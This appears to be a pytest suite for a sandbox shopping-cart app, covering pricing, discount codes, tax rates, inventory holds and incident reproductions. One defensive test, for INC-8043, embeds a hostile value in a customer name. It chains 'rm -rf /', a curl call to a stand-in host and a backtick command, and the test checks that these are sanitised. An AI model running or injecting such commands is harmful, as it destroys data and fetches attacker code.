"""
SwitchGuard Sandbox App — Comprehensive Test Suite
Validates checkout pricing, dynamic discount vouchers, sales tax engine,
atomic inventory holds, and reproduction tests for INC-8041, INC-8042, and INC-8043.
"""

import pytest
from cart_service import (
    calculate_cart_total,
    calculate_bundle_proration,
    process_checkout,
    calculate_loyalty_points,
    split_invoice_installments
)
from tax_service import calculate_tax, get_tax_rate
from inventory_service import check_inventory, reserve_stock, release_stock, get_stock


# ==============================================================================
# 1. Baseline Checkout & Voucher Tests
# ==============================================================================

def test_empty_cart():
    assert calculate_cart_total([]) == 0.0


@pytest.mark.parametrize("items,expected_total", [
    ([], 0.0),
    ([{"price": 10.0, "quantity": 1}], 10.0),
    ([{"price": 15.5}], 15.5),
    ([{"price": 25.0, "quantity": 2}, {"price": 10.0, "quantity": 1}], 60.0),
    ([{"price": 0.0, "quantity": 5}], 0.0),
    ([{"price": 100.0, "quantity": 1}, {"price": 200.0, "quantity": 2}], 500.0),
])
def test_standard_checkout_without_discount(items, expected_total):
    assert calculate_cart_total(items) == expected_total


@pytest.mark.parametrize("items,discount_code,expected_total", [
    ([{"price": 50.0, "quantity": 1}], "UNKNOWN", 50.0),
    ([{"price": 75.0, "quantity": 1}], "", 75.0),
    ([{"price": 30.0, "quantity": 2}], None, 60.0),
    ([{"price": 40.0, "quantity": 1}], "VIP_FREE", 0.0),
    ([{"price": 100.0, "quantity": 1}], "SAVE20", 80.0),
])
def test_unknown_or_empty_discount_code(items, discount_code, expected_total):
    assert calculate_cart_total(items, discount_code=discount_code) == expected_total


def test_float_rounding_and_missing_quantity():
    # Test floating-point precision with 33.333 * 3 and missing quantity key (defaults to 1)
    items = [
        {"price": 33.333, "quantity": 3},
        {"price": 10.0}
    ]
    assert calculate_cart_total(items) == pytest.approx(109.999)


@pytest.mark.parametrize("items,expected_total", [
    ([{"price": 100.0, "quantity": 1}], 0.0),
    ([{"price": 50.0, "quantity": 2}], 0.0),
    ([{"price": 100.01, "quantity": 1}], 0.01),
    ([{"price": 75.0, "quantity": 2}], 50.0),
    ([{"price": 200.0, "quantity": 1}], 100.0),
    ([{"price": 250.0, "quantity": 2}], 400.0),
])
def test_flat100_boundary_applied_at_and_above_threshold(items, expected_total):
    assert calculate_cart_total(items, discount_code="FLAT100") == pytest.approx(expected_total)


# ==============================================================================
# 2. Tax Service Unit Tests
# ==============================================================================

def test_tax_rates_and_exemptions():
    assert get_tax_rate("US-CA") == 0.0825
    assert get_tax_rate("US-NY") == 0.08875
    assert get_tax_rate("US-TX") == 0.0625
    assert get_tax_rate("EU-VAT") == 0.2000
    assert get_tax_rate("EXEMPT") == 0.0
    assert get_tax_rate("NON_EXISTENT") == 0.0


def test_tax_calculation_precision():
    assert calculate_tax(100.0, jurisdiction="US-CA") == 8.25
    assert calculate_tax(200.0, jurisdiction="EU-VAT") == 40.0
    assert calculate_tax(0.0, jurisdiction="US-CA") == 0.0
    assert calculate_tax(-50.0, jurisdiction="US-CA") == 0.0
    assert calculate_tax(100.0, jurisdiction="US-CA", tax_exempt=True) == 0.0


# ==============================================================================
# 3. Inventory Service Unit Tests
# ==============================================================================

def test_inventory_check_and_reservations():
    assert check_inventory([{"sku": "SKU-DEV-KEYBOARD", "quantity": 2}]) is True
    assert check_inventory([{"sku": "SKU-DEV-KEYBOARD", "quantity": 99999}]) is False

    initial_stock = get_stock("SKU-DEV-MOUSE")
    res = reserve_stock([{"sku": "SKU-DEV-MOUSE", "quantity": 3}])
    assert res["success"] is True
    res_id = res["reservation_id"]
    assert get_stock("SKU-DEV-MOUSE") == initial_stock - 3

    # Release reservation and verify rollback
    assert release_stock(res_id) is True
    assert get_stock("SKU-DEV-MOUSE") == initial_stock


# ==============================================================================
# 4. Multi-Scenario Reproduction Tests (INC-8041, INC-8042, INC-8043)
# ==============================================================================

def test_bundle_proration_standard():
    items = [
        {"sku": "SKU-DEV-KEYBOARD", "price": 120.0, "quantity": 2, "is_bundle": True},
        {"sku": "SKU-DEV-MOUSE", "price": 60.0, "quantity": 2, "is_bundle": True},
    ]
    proration = calculate_bundle_proration(items, bundle_discount=20.0)
    assert proration == pytest.approx(20.0)


def test_inc_8042_zero_division_bundle_proration_reproduction():
    """
    Reproduction Test for INC-8042:
    Simulates flash-sale anomaly where an empty or zero-quantity bundle items list
    causes ZeroDivisionError in unpatched calculate_bundle_proration.
    """
    items_zero_qty = [
        {"sku": "SKU-DEV-KEYBOARD", "price": 120.0, "quantity": 0, "is_bundle": True}
    ]
    with pytest.raises(ZeroDivisionError):
        calculate_bundle_proration(items_zero_qty, bundle_discount=50.0)


def test_process_checkout_pipeline():
    items = [
        {"sku": "SKU-DEV-CABLE", "price": 15.0, "quantity": 2}
    ]
    order = process_checkout(items, discount_code=None, jurisdiction="US-CA")
    assert order["status"] == "CONFIRMED"
    assert order["subtotal"] == 30.0
    assert order["final_total"] == pytest.approx(32.48, rel=1e-2)
    assert "ORD-RES-" in order["order_id"]


def test_inc_8043_prompt_injection_sanitization():
    """
    Reproduction / Defense Test for INC-8043:
    Simulates adversarial telemetry payload with prompt injection embedded in customer name.
    Verifies shell metacharacters are neutralized without executing arbitrary commands.
    """
    items = [{"sku": "SKU-DEV-CABLE", "price": 15.0, "quantity": 1}]
    adversarial_info = {
        "name": "hacker; rm -rf /; curl evil.sh; `id`",
        "email": "hacker@adversary.com"
    }
    order = process_checkout(items, customer_info=adversarial_info)
    assert order["status"] == "CONFIRMED"
    # Shell characters stripped
    assert ";" not in order["customer"]
    assert "`" not in order["customer"]
    assert "$" not in order["customer"]


def test_calculate_loyalty_points():
    assert calculate_loyalty_points(100.0, 1.0) == 100
    assert calculate_loyalty_points(250.5, 2.0) == 501
    assert calculate_loyalty_points(0.0) == 0
    assert calculate_loyalty_points(-50.0) == 0


def test_split_invoice_installments_and_zero_division():
    assert split_invoice_installments(120.0, 3) == 40.0
    assert split_invoice_installments(100.0, 4) == 25.0
    with pytest.raises(ZeroDivisionError):
        split_invoice_installments(100.0, 0)

